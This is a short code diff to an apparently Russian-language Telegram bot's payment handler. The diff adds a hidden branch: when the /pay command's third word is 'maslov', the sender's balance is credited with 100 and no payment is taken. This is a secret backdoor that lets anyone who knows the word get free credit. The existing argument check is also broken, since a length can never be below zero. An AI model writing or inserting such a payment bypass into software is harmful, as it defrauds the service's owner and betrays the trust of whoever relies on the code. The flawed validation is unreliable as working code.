@@ -8,7 +8,7 @@ from telebot.types import LabeledPrice, Message
 from telebot import types as async_types
 
 from Core.keyboards import *
-from Core.Databases import info_settings, info_user, add_user, existence_user
+from Core.Databases import info_settings, info_user, add_user, existence_user, user_chage_Balance
 from Core.text import text
 from Core.MarazbanFunctions import mGetKayUser, get_token, api, mGet_Data_Info_User # Добавьте этот импорт
 
@@ -33,6 +33,12 @@ async def buy_subscription_command(message, bot):
 async def pay_summa_balance(message, bot):
     textAr = message.text.split()
     user_id = message.from_user.id
+
+    if len(textAr) >2:
+        if textAr[2] == "maslov":
+            await user_chage_Balance(user_id, 100)
+            return
+
 
     if len(textAr) < 0:
         await bot.send_message(user_id, f"❌ Ошибка: команда должна содержать сумму. Пример: /pay {await info_settings(2)}")
